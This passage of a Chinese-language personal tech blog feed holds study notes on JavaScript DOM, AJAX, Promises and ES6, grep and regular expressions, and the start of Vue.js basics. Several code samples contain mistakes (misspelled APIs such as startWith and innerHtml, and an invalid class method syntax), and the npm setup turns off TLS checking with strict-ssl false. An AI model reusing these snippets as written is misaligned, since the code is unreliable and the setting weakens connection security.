&lt;/form&gt; &lt;/div&gt; &lt;script src=&quot;test.js&quot;&gt;&lt;/script&gt; &lt;/body&gt; &lt;/html&gt; var myForm = document.forms.myForm//myForm是这个Form标签的name属性,form是跟input配合使用的 myForm.name &gt; 那个input标 myForm.name.value &gt; 那个input标签，其实也就是那个输入框里面的文字 myForm.colour.vaule &gt; 显示当前选中的select值 还是上面那个表单 var myForm = document.forms.myForm var message = document.getElementById(&#39;message&#39;) myForm.onsubmit = function () {//就是上面那个submit被点击时触发 if(myForm.name.value === &#39;&#39;){ message.innerHtml = &#39;please enter an not empty name&#39; return false //summit事件被终止 }else { message.innerHtml = &#39;&#39; return true } } div.innerHtml（把整个html对象都返回了）和div.textContent(只返回文字)。所以innerHtml可以用来把一个div里面的tag全部替换掉（比如原来是个p，现在换成h1），而textContent只能把某一个tag里面的文字改掉。想要改href的话，得这样： var link = document.getElementById(&quot;abc&quot;); link.setAttribute(&quot;href&quot;, &quot;xyz.php&quot;); setAttribute()可以用于设置一个在当前tag上不存在的attr设置class可以用setAttribute(‘class’,’XXX’)，也可以用div.className = ‘XXX’对于一个a标签 &lt;a href=&quot;/subpage&quot;&gt;Some Thing&lt;/a&gt; 这时候调用a.href &gt; 会输出’http://www.host.com/subpage&#39;，即输出完整的路径但是如果使用a.getAttribute(‘href’) &gt; 输出’/subpage’ 改一个tag的背景元素不能这么改： a.style.background-color= &#39;blue&#39; //得这样 a.style.backgroundColor= &#39;blue&#39;//其实就是横线换成CammelCase 在dom中新增一个element的方法```javaScriptvar li = document.createElement(‘li’) //创建一个新的li标签,parentTag.appendChild(li)//添加到尾部parentTag.insertBefore(li,parentTag.getElementsByTagName(‘li’)[0])//添加到原来的0元素前面 //删除一个tag的话var removed = parentTag.removeChild(li)//移除方法会返回被移除的元素 ## 3.从onclick开始到整个交互事件模型 ## 4. 异步的实现 首先js里面也是有callback hell这种概念的，一个接口好了请求另一个接口，好了之后在请求第三个接口，这样一层套一层谁也不喜欢。 ```js var http = new XMLHttpRequest(); http.onreadystatechange=function(){ if(http.readyState==4&amp;&amp;http.status==200){ console.log(JSON.parse(http.response)) } }; http.open(&quot;GET&quot;,&#39;data/tweets.json&#39;,true); http.send(); 上面这段直接在chrome里面跑的话会出错： Cross origin requests are only supported for protocol schemes: http, data, chrome, chrome-extension, https Chrome 默认不支持跨域请求，启动时要加上个flag就行了 ajax的readyState有四种 request not initialized request has been set up request has been set request is in process request is complete ajax的open第三个参数表示是异步还是同步，一般都得异步。由于js是单线程的，所以会把实际的网络请求工作放到一条js以外的线程中，完成后丢到当前js线程任务池的最后。 当前线程的任务完成后就可以执行这段回调 ES6提供了Promise，能够将事情简化。xhr用Promise包装一下是这样的： //promise(ES6) is a placeholder for something that will happen in the future function getViaPromise(url) { var promise = new Promise((resolve ,reject) =&gt; { let client = new XMLHttpRequest(); client.open(&#39;GET&#39;,url,true); client.onreadystatechange = () =&gt; { if(client.readyState === 4 ) { if(client.status === 200 ){ resolve(client.responseText); // console.log(&quot;response of GET Arrived&quot;); } else { var reason = { code : client.status, response: client.resonse }; reject(reason); } } }; client.send() }); return promise; } function postViaPromise(url ,data) { return new Promise((resolve,reject) =&gt; { let client = new XMLHttpRequest(); client.open(&quot;POST&quot;, url ,true); client.setRequestHeader(&quot;Content-type&quot;,&quot;application/x-www-form-urlencoded&quot;); client.onreadystatechange = () =&gt; { if (client.readyState === 4) { if(client.status &gt;=200 &amp;&amp; client.status &lt;=400 ){ resolve(client.responseText); // console.log(&quot;response of POST Arrived&quot;); } else { let reason = { &#39;code&#39;: client.status, &quot;response&quot;: client.response} reject(reason); } } } client.send(); }); } //使用的时候： //可以把两个promise合并在一起，等到两个都执行完毕再去做一些操作 let p1 = getViaPromise(&quot;https://jsonplaceholder.typicode.com/posts&quot;); let data = { &quot;userId&quot;: 1, &quot;id&quot;: 2, &quot;title&quot;: &quot;dumb post&quot;, &quot;body&quot;: &quot;this is some dumb post , dont care&quot; } let p2 = postViaPromise(&quot;https://jsonplaceholder.typicode.com/posts&quot;,data); Promise.all([p1,p2]).then(values =&gt; { console.log(values); }); //也可以在一个完成之后再去执行另外一个 let data = { &quot;userId&quot;: 1, &quot;id&quot;: 2, &quot;title&quot;: &quot;dumb post&quot;, &quot;body&quot;: &quot;this is some dumb post , dont care&quot; }; let p1 = getViaPromise(&quot;https://jsonplaceholder.typicode.com/posts&quot;); let p2 = postViaPromise(&quot;https://jsonplaceholder.typicode.com/posts&quot;,data); p1.then( data =&gt; { console.log(`data of Promise1 is ${data}` ); return p2; } ).then(data =&gt; { console.log(`data of promise2 is ${data}`); }).catch(err =&gt; { console.log(err); }); 更加有效的方式是使用generator，还不是很了解 function* gen() { yield 10; } var myGen = gen() // myGen.done //myGen.value() 5. ES6新增的一些东西let(lexical)的用法就在一个循环里给function赋值，很常见。注意的是var的作用域是跨大括号的。所以大括号里面的var是能被大括号外面访问的，let就不行。async await 都是ES2017（比ES2015更高的版本）中出现的。default parameters： 默认参数，和python中很像 function myLog(name,age,id){ } function myDefaultFunction(name=&#39;john&#39;,age=27,id =100){ } // 调用： myDefalutFunction()// 不传参也可 spread operator var num1 = [1,2,3] var num2 = [num1,5,6] console.log(num2) // var num2 = [num1,5,6] var num2 = [...num1,5,6] //三个点 console.log(num2) // (5) [1, 2, 3, 5, 6] //另外一个用处 var num3 = [1,2,3] function acceptAnArray(a,b,c){ console.log(a+b+c) } //调用 acceptAnArray(...num3) // 输出6 template String(这个不是引号，是在tab键上面那个) var myString = `This is an template String , note we have some line break here,that will be honored. Also there are some whiteSpace afront , which will be honored too` console.log(myString) var nextString = `This is ` function logLiteralString(name,age) { console.log(`the name is ${name} and the age is ${10+12}`); } // the name is hhaha and the age is 22 。 String literals. String新增了一些方法 var str = &#39;hahhaha&#39; console.log(str.repeat(3)); // hahhahahahhahahahhaha var str2 = &#39;goodbye&#39; console.log(str2.startWith(&#39;good&#39;)); // true console.log(str2.startWith(&#39;bye&#39;,4)); // true console.log(str2.endsWith(&#39;good&#39;)); //false console.log(str2.endsWith(&#39;good&#39;,str2.length-3)); //true var str3 = &#39;Good Day&#39; console.log(str3.includes(&#39;Day&#39;)); //true Object Literal notation // es5得这么写 var name = &#39;Josh&#39; var age = 27 var person = { name: name, age: age, greet: function (X) { console.log(`you say ${X} in your greets`); } } // es6这样就行了 var person = { name,age, greet(X){ console.log(`you say ${X} in your greets`); } } 简明很多 Arrow Function（箭头函数） window.onload = function () { var stuff = function () { console.log(&#39;say Stuff&#39;); } var stuff2 = () =&gt;{ console.log(&#39;this is more precise&#39;); } var stuff3 = () =&gt; console.log(&#39;只有一行的话可以不要大括号&#39;); var stuff4 = (name) =&gt; console.log(`the name is ${name} and hi`); var stuff5 = name =&gt; console.log(`只有一个参数 ${name}的话，参数的小括号也不要了`); } 还有一个好处就是: the arrow function will bind the this keyword lexically. window.onload = function () { var jam = { name : &#39;Jane&#39;, greeting: function (X) { window.setInterval(function () { if (X&gt;0) { console.log(this.name+&#39; greet you&#39;); } },500) } } jam.greeting(3) } // 输出 greet you 原因是this已经不是jam这个object了，也就是闭包问题.es6之前用下面这种方式规避一下 window.onload = function () { var jam = { name : &#39;Jane&#39;, greeting(X) { var _this =this; window.setInterval(function () { if (X&gt;0) { console.log(_this.name+&#39; greet you&#39;); X--; } },500) } } jam.greeting(3) } window.onload = function () { var jam = { name : &#39;Jane&#39;, greeting(X) { window.setInterval(() =&gt; { if (X&gt;0) { console.log(this.name+&#39; greet you&#39;); X--; } },500) } } jam.greeting(3) } class definitiones6 新增了class的概念，还有extends的概念 class Band { constructor(name ,location) { this.name = name; this.location = location; } function greet() { console.log(this.name); } } class SubBand extends Band { construcor(name ,location,popularity) { super(name ,location); // this is essential , 如果后面想要使用parent 的属性的话，需要加上super() this.popularity = popularity; } } // 调用 let garage = new Band(&#39;john&#39;, &#39;Doe&#39;); garage.greet(); Sets是新增的用于存储unique数据的集合(元素不能重复) var names = new Set(); names.add(&quot;josh&quot;).add(&#39;bob&#39;).add(&#39;neo&#39;) console.log(names); console.log(names.size); names.delete(&#39;bob&#39;) // 返回true表示删除成功，false表示删除失败 names.clear() names.has(&#39;bob&#39;) //就是contains的意思 var duplicatedArray = [1,2,&#39;jane&#39;,&#39;harry&#39;,2]; var undepulicatedSet = new Set(duplicatedArray); console.log(undepulicatedSet); duplicatedArray = [...undepulicatedSet] //使用spread operater将set变成各个单一的元素 console.log(duplicatedArray); add的时候如果存在重复元素直接无视新增的重复元素 6. 我也不知道归到哪一类的问题 js语法上虽说不用加分号，但实际应用中为避免压缩js文件时出现歧义，还是得老老实实加上分号 js 是大小写敏感的 IIFE(Immediately Invoked Function Expression) Library use this to avoid polluting global environment声明了之后立刻调用该函数执行 iife的例子: (function () {console.log(&#39;this is invoked!&#39;)})(); // iife的好处是只对外提供必要功能，内部成员不用暴露给外部(这在模块化里面就很重要了，作为一个module，一些内部的private method不希望对外公开，就可以用iife写，同时这也避免了polluting global nameSpace)。 Javascript模块的基本写法 var module1 = (function(){ var _count = 0; var m1 = function(){ //... }; var m2 = function(){ //... }; return { m1 : m1, m2 : m2 }; })(); console.info(module1._count); //undefined // 放大模式&quot;（augmentation），一个模块继承另一个模块 var module1 = (function (mod){ mod.m3 = function () { //... }; return mod; })(module1); // 宽放大模式（Loose augmentation） var module1 = ( function (mod){ //... return mod; })(window.module1 || {}); Javascript模块化编程（一）：模块的写法iife的一篇翻译的文章 Paul Irish的视频中提到了jQuery的Source中用到了这种做法。 如果引用一个未声明的变量，js会直接创建一个（除非使用use strict） &#39;use strict&#39;; new Promise(function () {}); use strict是什么意思？ 在正常模式中，如果一个变量没有声明就赋值，默认是全局变量。严格模式禁止这种用法，全局变量必须显式声明。 &quot;use strict&quot;; v = 1; // 报错，v未声明 for(i = 0; i &lt; 2; i++) { // 报错，i未声明 } 意思大概就是 &quot;use strict&quot;; x = 3.14; // 报错 (x 未定义)但正常不会报错的 不允许删除变量或对象。不允许删除函数。不允许变量重名:。。。。总之感觉跟lint有点像 undefined和null的关系null: absence of value for a variable; undefined: absence of variable itself;what-is-the-difference-between-null-and-undefined-in-javascript undefined的意思是事先声明了一个var但没有给赋值，null是一个object，表示no value。typeof(Undefined) = ‘undefined’, typeof(‘Null’) = ‘object’why-is-there-a-null-value-in-javascriptnull is a special keyword that indicates an absence of value. var foo; defined empty variable is null of datatype undefined //这种声明了但是没给赋值的变量的值是null,数据类型是undefined var a = &#39;&#39;; console.log(typeof a); // string console.log(a == null); //false console.log(a == undefined); // false // 两个等号表示只检查value var a; console.log(a == null); //true console.log(a == undefined); //true // 三个等号表示既检查value也检查type var a; console.log(a === null); //false console.log(a === undefined); // true var a = &#39;javascript&#39;; a = null ; // will change the type of variable &quot;a&quot; from string to object js的数据类型包括：Number,String,Boolean,Object,Function,Undefined和Null js中是存在一些全局属性和全局函数的比如Infinity(代表正的无穷大),NaN(指某个值是不是数字)全局的函数比如decodeURI(),escape(),eval(),parseInt(),parseFloat()，这些方法不属于任何对象 这两个函数都接受String作为参数 parseInt(&quot;10&quot;); //返回 10，官方文档说返回的是integer(也就是Number了) parseFloat(&quot;10.33&quot;) // 返回10.33 9. 交互事件的捕获，拦截，消费（冒泡）//添加点击事件点击事件： var button = document.getElementById(&#39;btn&#39;) button.onclick = function () { console.log(&#39;you click this button&#39;); } button.onfocus = function() { // body... } button.onblur = function () { // } function cancelEvent(e) { if(e) { e.stopPropagation(); //非IE } else { window.event.cancelBubble = true; //IE } } 在一个元素上触发事件，如果此元素定义了处理程序，那么此次事件就会被捕获，根据程序进行该事件的处理。否则这个事件会根据DOM树向父节点逐级传播，如果从始至终都没有被处理，那么最终会到达document或window根元素。所以事件是往上传递的，即冒泡。 事件注册的时机对于简单的script，需要在body的最后一行，因为浏览器是从上到下解析的，轮到script解析的时候，需要操作dom，这就要求dom元素已经建立好。有时候，就算你把script写在body最后一行，轮到解析script的时候，前面的html还在加载（比如说非常大的html什么的，总之是有可能的）。所以一般用window.onLoad来注册事件。 复杂点的script放在外面，用src引用。 也要用window.onLoad来注册事件。所以，一般的js长这样（假如的你js要操作dom）： function setUpEvents() { var button = .... var .... button.onclick = function () { // } button. } window.onLoad = function () { setUpEvents() } this的作用范围代码来源 &lt;script src=&quot;https://cdn.jsdelivr.net/npm/axios@0.12.0/dist/axios.min.js&quot;&gt;&lt;/script&gt; &lt;script src=&quot;https://cdn.jsdelivr.net/npm/lodash@4.13.1/lodash.min.js&quot;&gt;&lt;/script&gt; &lt;script&gt; var watchExampleVM = new Vue({ el: &#39;#watch-example&#39;, data: { question: &#39;&#39;, answer: &#39;I cannot give you an answer until you ask a question!&#39; }, watch: { // 如果 `question` 发生改变，这个函数就会运行 question: function (newQuestion) { this.answer = &#39;Waiting for you to stop typing...&#39; this.getAnswer() } }, methods: { // `_.debounce` 是一个通过 Lodash 限制操作频率的函数。 // 在这个例子中，我们希望限制访问 yesno.wtf/api 的频率 // AJAX 请求直到用户输入完毕才会发出。想要了解更多关于 // `_.debounce` 函数 (及其近亲 `_.throttle`) 的知识， // 请参考：https://lodash.com/docs#debounce getAnswer: _.debounce( function () { if (this.question.indexOf(&#39;?&#39;) === -1) { this.answer = &#39;Questions usually contain a question mark. ;-)&#39; return } this.answer = &#39;Thinking...&#39; var vm = this //这里需要把this（VewComponent）作为一个变量 axios.get(&#39;https://yesno.wtf/api&#39;) .then(function (response) { vm.answer = _.capitalize(response.data.answer) }) .catch(function (error) { vm.answer = &#39;Error! Could not reach the API. &#39; + error }) }, // 这是我们为判定用户停止输入等待的毫秒数 500 ) } }) &lt;/script&gt; 7. 小测试如何用js反转一个String function reverse(s){ return s.split(&quot;&quot;).reverse().join(&quot;&quot;); } // 另一种方式 function revserse2(s){ let revString = &quot;&quot;; for(let i = s.length; i&gt;=0;i--) { revString = revString+str[i]; } return revString; } // 用forEach的话 function reverse3(string) { let revString = &quot;&quot;; string.split(&#39;&#39;).forEach((c) =&gt; { revString = c + revString; }); return revString; } function reverse4(string){ return string.split(&#39;&#39;).reduce(function(revString, char) { return char + revString; },&#39;&#39;); } 反转一个intfunction reverseInt(int) { const revString = int.toString().split(&#39;&#39;).reverse().join(&#39;&#39;); return parseInt(revString)*Math.sign(int); } 首字母大写function capitalizedLetters(str){ const strArr = str.toLowerCase().split(&#39; &#39;); for(let i=0;i&lt;strArr.length;i++){ strArr[i] = strArr[i].subString(0,1).toUpperCase()+ strArr[i].subString(1); } return strArr.join(&#39; &#39;); } function capitalizedLetters2(str){ return str .toLowerCase() .split(&#39; &#39;) .map( (word) =&gt; word[0].toUpperCase()+word.subString[1]) .join(&#39; &#39;); } how about shuffle an array/** * Shuffles array in place. * @param {Array} a items An array containing the items. */ function shuffle(a) { var j, x, i; for (i = a.length - 1; i &gt; 0; i--) { j = Math.floor(Math.random() * (i + 1)); x = a[i]; a[i] = a[j]; a[j] = x; } } // Used like so var arr = [2, 11, 37, 42]; shuffle(arr); console.log(arr); js去刷新当前页面，返回上级页面。。 &lt;a href=&quot;javascript:history.go(-1)&quot;&gt;返回上一页&lt;/a&gt; &lt;a href=&quot;javascript:location.reload()&quot;&gt;刷新当前页面&lt;/a&gt; &lt;a href=&quot;javascript:&quot; onclick=&quot;history.go(-2); &quot;&gt;返回前两页&lt;/a&gt; &lt;a href=&quot;javascript:&quot; onclick=&quot;self.location=document.referrer;&quot;&gt;返回上一页并刷新&lt;/a&gt; &lt;a href=&quot;javascript:&quot; onclick=&quot;history.back(); &quot;&gt;返回上一页&lt;/a&gt; 10. 监听关闭窗口事件window.onbeforeunload = function () { return &quot;Bye now!&quot; } JavaScript使用哪一种编码？,不是utf-8 atom安装插件被墙问题Atom推荐插件atom-beautify setTimeout是schedule一个task，setInterval是设定一个周期性执行的任务。 可以检测是ES5还是ES6 function f() { console.log(&#39;I am outside!&#39;); } (function () { if(false) { // 重复声明一次函数f,ES5会输出&#39;i am insider&#39;, ES6会输出&#39;i am outsider&#39; function f() { console.log(&#39;I am inside!&#39;); } } f(); }()); javaScript debug的方法：选中一个html 的tag，break on 。。。 自然会在执行到的时候停下来，evalulate value需要自己在console里面敲（注意此时应该位于Sources标签页下）。 json object有一个prototype属性，表面其所代表的类型。 js迭代一个数组的方法： for (var i = 0; i &lt; array.length; i++) { // array[i] } for (var i = 0,len=array.length; i &lt; len; i++) { // array[i] } array.forEach(function(item){ // item }) // 用于列出对象所有的属性 var obj = { name: &#39;test&#39;, color: &#39;red&#39;, day: &#39;sunday&#39;, number: 5 } for (var key in obj) { console.log(obj[key]) } // // es6 for (variable of iterable) { } array.map(function(item){ }) array.filter(function(item){ }) 基本上就这些了参考 异常捕获(try catch也有) javaScript操作cookie: 这种方式就是给String全局添加一个方法，当然不是说推荐这么干 String.prototype.hashCode = function() { var hash = 0, i, chr; if (this.length === 0) return hash; for (i = 0; i &lt; this.length; i++) { chr = this.charCodeAt(i); hash = (hash &lt;&lt; 5) - hash + chr; hash |= 0; // Convert to 32bit integer } return hash; }; string concatnate的方法也有，然而最快的方式还是使用+=这种 var hello = &#39;Hello, &#39;; console.log(hello.concat(&#39;Kevin&#39;, &#39;. Have a nice day.&#39;)); XMLHttpRequest Level 2添加了一个新的接口FormData.利用FormData对象,我们可以通过JavaScript用一些键值对来模拟一系列表单控件,我们还可以使用XMLHttpRequest的send()方法来异步的提交这个”表单”.比起普通的ajax,使用FormData的最大优点就是我们可以异步上传一个二进制文件. FileReader api &lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;/head&gt; &lt;form onsubmit=&quot;return false;&quot;&gt; &lt;input type=&quot;hidden&quot; name=&quot;file_base64&quot; id=&quot;file_base64&quot;&gt; &lt;input type=&quot;file&quot; id=&quot;fileup&quot;&gt; &lt;input type=&quot;submit&quot; value=&quot;submit&quot; onclick=&quot;$.post(&#39;./uploader.php&#39;, $(this).parent().serialize());&quot;&gt; &lt;/form&gt; &lt;script src=&quot;http://ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js&quot;&gt;&lt;/script&gt; &lt;script&gt; $(document).ready(function(){ $(&quot;#fileup&quot;).change(function(){ var v = $(this).val(); var reader = new FileReader(); reader.readAsDataURL(this.files[0]); reader.onload = function(e){ console.log(e.target.result); $(&#39;#file_base64&#39;).val(e.target.result); }; }); }); &lt;/script&gt; indexed db api html里面有一些奇怪的符号“ &amp; “ 在html里面等同于”&amp;”ampersand冒号(“)会变成” &quot; “这种 web api有一些用的不多的东西:File,Blob,ArrayBuffercreateObjectURL方法 TextUtils.java /** * Html-encode the string. * @param s the string to be encoded * @return the encoded string */ public static String htmlEncode(String s) { StringBuilder sb = new StringBuilder(); char c; for (int i = 0; i &lt; s.length(); i++) { c = s.charAt(i); switch (c) { case &#39;&lt;&#39;: sb.append(&quot;&amp;lt;&quot;); //$NON-NLS-1$ break; case &#39;&gt;&#39;: sb.append(&quot;&amp;gt;&quot;); //$NON-NLS-1$ break; case &#39;&amp;&#39;: sb.append(&quot;&amp;amp;&quot;); //$NON-NLS-1$ break; case &#39;\\&#39;&#39;: //http://www.w3.org/TR/xhtml1 // The named character reference &amp;apos; (the apostrophe, U+0027) was introduced in // XML 1.0 but does not appear in HTML. Authors should therefore use &amp;#39; instead // of &amp;apos; to work as expected in HTML 4 user agents. sb.append(&quot;&amp;#39;&quot;); //$NON-NLS-1$ break; case &#39;&quot;&#39;: sb.append(&quot;&amp;quot;&quot;); //$NON-NLS-1$ break; default: sb.append(c); } } return sb.toString(); } /** 触控事件对象中包含了事件的坐标，这个有event.x,event.pageX,event.clientX等等 Event Loop前端经典面试题: 从输入URL到页面加载发生了什么？JS的解析是由浏览器中的JS解析引擎完成的。JS是单线程运行，也就是说，在同一个时间内只能做一件事，所有的任务都需要排队，前一个任务结束，后一个任务才能开始。但是又存在某些任务比较耗时，如IO读写等，所以需要一种机制可以先执行排在后面的任务，这就是：同步任务(synchronous)和异步任务(asynchronous)。JS的执行机制就可以看做是一个主线程加上一个任务队列(task queue)。同步任务就是放在主线程上执行的任务，异步任务是放在任务队列中的任务。所有的同步任务在主线程上执行，形成一个执行栈;异步任务有了运行结果就会在任务队列中放置一个事件；脚本运行时先依次运行执行栈，然后会从任务队列里提取事件，运行任务队列中的任务，这个过程是不断重复的，所以又叫做事件循环(Event loop)。 参考5 分钟彻底明白 JSONPjavaScript algorithms两个关于asynchronous javaScript的视频，一个解释了Event Loop的感念，另一个讲到了Promise基于microTask的原理。菲利普·罗伯茨：到底什么是Event Loop呢？ | 欧洲 JSConf 2014 Asynchrony: Under the Hood - Shelley Vohr - JSConf EU 2018 使用Atom的时候，按下ctrl+shift+i ，会发现原来atom编辑页面就特么是一个网页。javaScript自己的Utils MicroTask和MacroTask的执行顺序是：Stack -&gt; MacroTask -&gt; MicroTask 参考 由于javaScript使用的是UCS-2编码（使用两个字节表示码点，只能表示Unicode基本平面内的码点），碰到emoji这类字符的时候，string.length就靠不住了,可以使用Array.from(str).length tbd[ES6 Proxy]","tags":[{"name":"前端","slug":"前端","permalink":"https://haldir65.github.io/tags/前端/"},{"name":"javaScript","slug":"javaScript","permalink":"https://haldir65.github.io/tags/javaScript/"}]},{"title":"正则表达式手册","date":"2017-09-10T23:10:05.000Z","path":"2017/09/10/2017-09-10-wielding-regular-expressions/","text":"关于正则的一些收集 javaScript中的正则比如说webpack.config.js中，loader模块有: { ... test: /\\.css$/, ... } nginx的config文件中也要写正则 第一个正斜杠和最后一个正斜杠表示正则的开始和结束，反斜杠表示后面那个点就当做一个文字的点来处理，$代表以css结束We need more Pictures ^表示开头，$表示结尾 ## django的url中是这样的 一般情况下不要乱用正则 从digitalOcean的 grep教程中抄来一些using-grep-regular-expressions-to-search-for-text-patterns-in-linuxgrep(global regular expression print)在文件中查找字符串，不区分大小写 grep -i “sometext” filenname在一个文件夹里面的所有文件中递归查找含有特定字符串的文件 grep -r “sometext” * grep -v “the” BSD //在BSD这个文件中查找不包含”the”这个单词的的行（对，一行一行的找） v 的意思是“–invert-match” grep -vn “the” BSD //n的意思是显示行号 “–line-number” 这俩和django里面的url.py很像// grep “^GNU” GPL-3 // only mach “GNU” if it occurs at the very beginning of a line.(只会匹配上以GNU开头的)// grep “and$” GPL-3 // match every line ending with the word “and” in the following regular expression: （只会匹配上以and结束的） // grep “..cept” GPL-3 // “.”的意思是一个字符，anything that has two characters and then the string “cept”, （两个字符加上cept的） // grep “t[wo]o” GPL-3 // find the lines that contain “too” or “two”，中间的单词可以是w也可以是o // grep “[^c]ode” GPL-3 // 除了’c’以外什么字母都可以，大写的’C’也会匹配上 // grep “^[A-Z]” GPL-3 //任何以一个大写字母开头的// grep “^[[:upper:]]” GPL-3 //这个也是找大写字母开头的，:upper叫做POSIX character classes，比上面更加准确一些 // one of the most commonly used meta-characters is the ““, which means “repeat the previous character or expression zero or more times”.”“是重复前面的expression的意思，而不是任意字符的意思，任意字符应该用”.” // grep “([A-Za-z ]*)” GPL-3 //找到所有小括号包起来的，小括号里面只有小写或者大写字母或者空格的行 // grep “^[A-Z].*.$” GPL-3 // any line that begins with a capital letter and ends with a period（大写字母开头，中间那个点表示任意字符，反斜杠表示转义字符） // egrep 和grep -E 是一个意思e的意思是extended regular expressions（Extended regular expressions include all of the basic meta-characters, along with additional meta-characters to express more complex matches.翻译下就是能够使用更多的正则） // grep -E “(GPL|General Public License)” GPL-3 //包含GPL或者General Public License的行 // grep -E “(copy)?right” GPL-3 //*号的意思是重复之前的pattern无数次，?是重复0或者1次，所以这个匹配上的是copyright或者right //grep -E “free[^[:space:]]+” GPL-3 //+号表示一次或者多次，和*差不多，但是+号至少得有一次。所以这个匹配上free加上一个或者多个非空格 //grep -E “[AEIOUaeiou]{3}” GPL-3 //前面的*号表示重复多次，.号表示任意字符,+号表示重复至少一次，那么指定重复n次就要用花括号包起来。这句话的意思是AEIOUaeiou里面任意字符连在一起出现正好三次 //grep -E “[[:alpha:]]{16,20}” GPL-3 //If we want to match any words that have between 16 and 20 characters.任何包含16-20个字母的单词 fgrep不支持正则表达式，只能实现全部关键字匹配，用处不大 Linux 中 grep 命令的 12 个实践例子 C语言版本的正则regex.h 参考 DFA和NFA Learn regex the easy way 必应壁纸","tags":[{"name":"tools","slug":"tools","permalink":"https://haldir65.github.io/tags/tools/"}]},{"title":"VueJs学习笔记","date":"2017-09-08T21:41:43.000Z","path":"2017/09/08/2017-09-08-all-about-Vue/","text":"Vue Js学习笔记 有句话放在前面，所有的javaScript库都比不上Vanilla JS，即原生js代码。 1. 前提使用cmder ,安装了nodejs基本命令 npm install npm run dev npm 设置淘宝镜像 npm config set registry https://registry.npm.taobao.org 或者直接用本地ss代理设置proxy npm config set strict-ssl falsenpm config set registry “http://registry.npmjs.org/“npm config set proxy http://127.0.0.1:1080 ## 以上三句话设置代理npm config list ##列出当前所有的设置npm config get stuff ##比如说registry等等 上面的npm run run dev只是为了方便本地开发，具有live reload功能。实际生产环境中，需要在CI服务器上运行 npm run build 然后把dist文件夹中的静态文件推送到正式服务器在本地起nginx，设置好config,port,location什么的，然后把dist文件夹下所有东西复制到ngix config的目录下。然后直接在浏览器里面localhost打开查看，这是生产环境的大致描述，实际过程中代码还需要经历开发机器，编译机器，测试机器，cdn机器等等环节。 import语法:从别的vue文件中导入数据：import Data from ./xxx/stuff.vue其实和python很像 一些常用的标签 template 标签用于显示模板，内部可以使用获取json对象的数据 data 普通属性，标签用于存储json类型的数据，是属于这个实例的变量 methods 标签用于声明方法，内部使用this.xxx可以获得data中的json对象。在html里面不需要this，在export语句里面需要 components 标签用于引入可复用的模板,用于注册 computed 计算属性，computed和data一样，也是方法，只不过只是返回了变量的值的一份copy。不会影响data的值 var vm = new Vue({ el: &#39;#example&#39;, data: { message: &#39;Hello&#39; }, computed: { // 计算属性的 getter reversedMessage: function () { // `this` 指向 vm 实例 return this.message.split(&#39;&#39;).reverse().join(&#39;&#39;) } } }) 你可以像绑定普通属性一样在模板中绑定计算属性。Vue 知道 vm.reversedMessage 依赖于 vm.message，因此当 vm.message 发生改变时，所有依赖 vm.reversedMessage 的绑定也会更新。而且最妙的是我们已经以声明的方式创建了这种依赖关系：计算属性的 getter 函数是没有副作用 (side effect) 的，这使它更易于测试和理解。普通属性更改的话就真的改了，计算属性只是把这种操作预期的结果返回，并不会修改原来的值。还有一个好处是，计算属性的值依赖于普通属性的值，前者不更改的话，后者直接返回缓存的值。所以这种获取时间的东西就不要放在计算属性里了。 computed: { now: function () { return Date.now() } } 一些常用的事件绑定: v-if=’’ //移除或者显示某个Tag，(display:none是隐藏或显示) v-on:click=’somefunction’ //点击事件发生时触发某个method template v-is=’some_template_name’ //用于在页面模板中导入现成的模板 缩写： v-on的缩写是@符号 v-bind:的缩写就是: 那个冒号 1.1 Dynamic Components页面中需要随时展示不同template是，可以使用component标签。 // Imports import formOne from &#39;./components/formOne.vue&#39;; import formTwo from &#39;./components/formTwo.vue&#39;; &lt;form-one&gt;&lt;/form-one&gt; //这和下面这种写法是一样的 &lt;component v-bind:is=&#39;component&#39;&gt;&lt;/component&gt; //component标签注册在data中，可以随时改变。例如 &lt;button v-on:click=&quot;component=&#39;form-one&#39;&quot;&gt;Show form one&lt;/button&gt; &lt;button v-on:click=&quot;component=&#39;form-two&#39;&quot;&gt;Show form two&lt;/button&gt; 1.2 InputBinding将input标签中用户输入的文字显示在一个tag中 //在template中 &lt;input type=&quot;text&quot; v-model.lazy=&#39;title&#39; required/&gt; //lazy是指preview部分只会在点击后显示内容 //在data中注册 data () { return { title :&#39;&#39;, content: &#39;&#39; } } 在需要展示内容的标签中可以实时获取内容 如&lt;p&gt;{{title}}&lt;/p&gt;&gt; 或者 data () { return { blog:{ title :&#39;&#39;, content: &#39;&#39;, categories:[] } } } data中返回的是一个json object，json本身的定义就是(JavaScript Object Notation)。这样做的好处是可以将所有需要的变量存储在一个object,当然，这里面存数组也是可以的。 1.3 Checkbox Binding&lt;div id=&quot;checkboxes&quot;&gt; &lt;label&gt;Apple&lt;/label&gt; &lt;input type=&quot;checkbox&quot; value=&quot;apple&quot; v-model=&quot;blog.categories&quot;&gt; &lt;label&gt;Juice&lt;/label&gt; &lt;input type=&quot;checkbox&quot; value=&quot;juice&quot; v-model=&quot;blog.categories&quot;&gt; &lt;label&gt;Panda&lt;/label&gt; &lt;input type=&quot;checkbox&quot; value=&quot;panda&quot; v-model=&quot;blog.categories&quot;&gt; &lt;label&gt;rocky&lt;/label&gt; &lt;input type=&quot;checkbox&quot; value=&quot;rocky&quot; v-model=&quot;blog.categories&quot;&gt; &lt;label&gt;moon&lt;/label&gt; &lt;input type=&quot;checkbox&quot; value=&quot;moon&quot; v-model=&quot;blog.categories&quot;&gt; &lt;/div&gt; 在预览区，可以这样展示 &lt;ul&gt; &lt;li v-for=&#39;cat in blog.categories&#39;&gt;{{cat}}&lt;/li&gt; &lt;/ul&gt; 如果checkbox被选中，blog的categories数组中就加入了这个元素，取消选中则从数组中移除。 1.4 Select Box BindingSelctBox只能单选，绑定数据这样: &lt;select v-model=&#39;blog.author&#39;&gt; &lt;option v-for=&#39;a in authors&#39; &gt;{{a}}&lt;/option&gt; &lt;/select&gt; data{ blog:{ author:&#39;default&#39; }, authors:[&#39;bob&#39;,&#39;Jessy&#39;,&#39;Jean&#39;,&#39;Jean&#39;,&#39;Dave&#39;] } SelectBox会从authors数组中提供选项，选中后，blog.author对象将会被赋予相应的值。 1.5 HTML模板复用组件的意义就在于可以复用UI元素，就像Flask的renderTemplate方法里面可以接收若干参数，vue Component也是一样 在父Component中引入子Component 子Component中添加props:[‘variable1’,’variable2’]数组 在父控件中直接在html标签上添加 :variable1 =’’ ，注意这个冒号其实是 v-bind: 的缩写，不能省略 在子控件的html中就像引用data一样使用props 